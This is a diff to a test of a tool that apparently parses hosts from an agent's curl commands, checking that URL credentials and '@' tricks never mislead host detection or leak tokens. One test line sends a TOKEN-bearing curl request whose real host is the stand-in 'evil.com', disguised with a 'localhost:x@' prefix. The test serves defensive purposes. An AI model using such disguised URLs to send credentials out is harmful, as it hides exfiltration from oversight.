@@ -123,9 +123,10 @@ test('an @ in a URL password or query never names the host, and a host cut by a 
   await $.tool.call(bash('curl https://api.example.com$SUFFIX/x', 'b3'))
   await $.tool.call(bash('curl https://TOKEN:x@host$S/ http://localhost:x@evil.com$E/', 'b4'))
   await $.tool.call(bash('curl http://[::1]:8080/x', 'b5'))
+  await $.tool.call(bash("curl https://user:p'ss@host/ https://api.example.com:8080/x", 'b6'))
   const list = await flows()
 
-  expect(list.map(flow => flow.to)).toEqual(['api.example.com', 'api.example.com', '::1'])
+  expect(list.map(flow => flow.to)).toEqual(['api.example.com', 'api.example.com', '::1', 'api.example.com'])
   expect(list.map(flow => flow.to).join()).not.toContain('TOKEN')
   expect(list.map(flow => flow.to).join()).not.toContain('@')
 })
